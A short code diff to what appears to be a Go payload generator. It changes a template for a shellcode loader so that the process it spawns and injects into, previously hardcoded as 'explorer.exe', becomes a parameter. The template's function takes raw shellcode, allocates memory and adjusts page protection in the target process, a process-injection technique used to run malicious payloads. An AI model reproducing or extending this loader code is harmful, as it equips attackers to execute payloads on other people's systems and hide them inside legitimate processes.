@@ -4,7 +4,7 @@ import (
 	"fmt"
 )
 
-func GetSyscallTemplate() string {
+func GetSyscallTemplate(targetProcess string) string {
 	return fmt.Sprintf(`
 package main
 
@@ -96,7 +96,7 @@ func loadProcess(target string) *syscall.ProcessInformation {
 func ExecuteOrderSixtySix(shellcode []byte) {
 
     /* spawn target process */
-    process := loadProcess("explorer.exe")
+    process := loadProcess("%s")
     oldProtectCfg := PAGE_READWRITE
 
      /* allocating the appropriate amount of memory */
@@ -147,5 +147,5 @@ func ExecuteOrderSixtySix(shellcode []byte) {
         os.Exit(1)
     }
 }
-    `)
+    `, targetProcess)
 }
